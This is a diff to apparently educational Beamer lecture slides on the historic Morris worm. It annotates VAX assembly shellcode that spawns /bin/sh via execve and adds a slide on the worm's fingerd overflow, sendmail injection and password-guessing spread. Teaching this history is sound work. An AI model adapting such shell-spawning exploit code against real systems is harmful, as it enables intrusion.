@@ -1,5 +1,5 @@
 
-\begin{frame}[fragile,label=morrisEx]{actual example: Morris worm}
+\begin{frame}[fragile,label=morrisEx]{actual example: Morris worm (1)}
 \begin{lstlisting}[language=C,style=smaller]
     /* reconstructed from machine code */
     for(i = 0; i < 536; i++) buf[i] = '\0';
@@ -25,13 +25,13 @@
 \begin{lstlisting}[language=myasm,morekeywords=chmk]
 pushl   $68732f      // "/sh\0"
 pushl   $6e69622f    // "/bin"
-movl    sp, r10
-pushl   $0
-pushl   $0
-pushl   r10
-pushl   $3
-movl    sp,ap
-chmk    $3b  // switch to OS ("CHange Mode to Kernel")
+movl    sp, r10      // r10 = "/bin/sh\0" (on stack)
+pushl   $0           // (execve arg 2; env)
+pushl   $0           // (execve arg 1; argv)
+pushl   r10          // (execve arg 0; file)
+pushl   $3           // ??arg count?
+movl    sp,ap        // set argptr = sp
+chmk    $3b    // switch to OS ("CHange Mode to Kernel")
 \end{lstlisting}
 \begin{itemize}
 \item write string /bin/sh on the stack (path to ``shell'')
@@ -39,3 +39,20 @@ chmk    $3b  // switch to OS ("CHange Mode to Kernel")
 \end{itemize}
 \end{frame}
 
+\begin{frame}[fragile,label=morrisEx]{actual example: Morris worm (2)}
+\begin{itemize}
+\item once getting a shell\ldots
+\item run commands to install program
+    \begin{itemize}
+    \item vulnerable `fingerd' program running with stdin/stdout connected to socket
+    \end{itemize}
+\vspace{.5cm}
+\item multiple exploit techniques to get shell
+    \begin{itemize}
+    \item this fingerd buffer overflow
+    \item sendmail command injection
+    \item logging in with guessed passwords
+    \end{itemize}
+\item installs self as \texttt{/usr/tmp/sh}
+\end{itemize}
+\end{frame}
